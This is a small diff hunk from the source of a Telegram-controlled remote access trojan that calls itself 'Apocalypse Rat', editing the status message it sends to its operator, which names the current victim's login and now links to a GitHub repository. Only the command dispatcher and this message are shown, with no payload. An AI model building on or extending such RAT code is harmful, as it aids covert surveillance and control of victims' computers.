@@ -433,7 +433,7 @@ def callback_query(call):
     elif call.data == 'system_monitor':
         system_monitor()
     elif call.data == 'mark':
-        bot.send_message(adm, f'🕳️ *Apocalypse Rat*\n\n*GitHub* - \n\n🆚*Версия клиента* - 0.0.2 BetaRls\n🫂*Текущий клиент* - {getlogin()}', parse_mode='Markdown')
+        bot.send_message(adm, f'🕳️ *Apocalypse Rat*\n\n*GitHub* - https://github.com/A-CodeCreater/ApocalypseRat\n\n🆚*Версия клиента* - 0.0.2\n🫂*Текущий клиент* - {getlogin()}', parse_mode='Markdown')
 
 
 while True:
